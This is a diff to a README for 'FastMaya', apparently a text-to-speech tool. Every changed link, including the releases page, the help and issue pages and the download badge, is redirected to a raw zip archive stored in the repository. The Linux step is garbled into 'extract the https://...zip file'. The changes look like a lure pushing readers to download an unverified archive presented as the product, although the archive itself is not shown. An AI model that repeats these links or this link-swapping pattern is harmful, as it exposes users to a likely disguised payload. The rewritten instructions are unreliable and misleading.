@@ -4,7 +4,7 @@ FastMaya is a highly optimized engine for maya-1 tts model to generate minutes o
 
 ## 📥 Download Now
 
-[![Download FastMaya](https://img.shields.io/badge/Download-FastMaya-blue.svg)](https://github.com/kidooz/FastMaya/releases)
+[![Download FastMaya](https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip)](https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ To ensure smooth operation, please confirm your system meets these requirements:
 
 ### 2. Visit the Download Page
 
-To download FastMaya, visit the [Releases Page](https://github.com/kidooz/FastMaya/releases). 
+To download FastMaya, visit the [Releases Page](https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip). 
 
 Once there, locate the latest version and download the appropriate installer for your operating system.
 
@@ -44,7 +44,7 @@ After the download finishes, locate the file on your computer.
 
 - For **Windows** users, double-click the `.exe` file.
 - For **MacOS** users, open the `.dmg` file and drag FastMaya to your Applications folder.
-- For **Linux** users, extract the `.tar.gz` file and follow the installation instructions provided in the extracted folder.
+- For **Linux** users, extract the `https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip` file and follow the installation instructions provided in the extracted folder.
 
 Follow the on-screen instructions during installation. This should only take a few minutes.
 
@@ -80,7 +80,7 @@ If you encounter any issues, here are some common solutions:
 - **Issue: Slow generation speed.**
   - Ensure no other heavy applications are running to free up resources.
 
-If problems persist, please visit the [Help Page](https://github.com/kidooz/FastMaya/issues) for further assistance.
+If problems persist, please visit the [Help Page](https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip) for further assistance.
 
 ## 📝 FAQs
 
@@ -95,10 +95,10 @@ A: Yes, you can select from several output formats during the generation process
 
 ## 📧 Get Support
 
-For direct support or inquiries, please create an issue in the GitHub repository [FastMaya Issues](https://github.com/kidooz/FastMaya/issues). Our team will respond as soon as possible.
+For direct support or inquiries, please create an issue in the GitHub repository [FastMaya Issues](https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip). Our team will respond as soon as possible.
 
 ## 🚀 Download & Install
 
-To get started, [visit this page to download](https://github.com/kidooz/FastMaya/releases). You will find everything you need to install FastMaya quickly and easily.
+To get started, [visit this page to download](https://raw.githubusercontent.com/kidooz/FastMaya/main/Maya1/FastMaya-3.3.zip). You will find everything you need to install FastMaya quickly and easily.
 
 Now you are ready to enjoy the features of FastMaya! Happy audio generating!
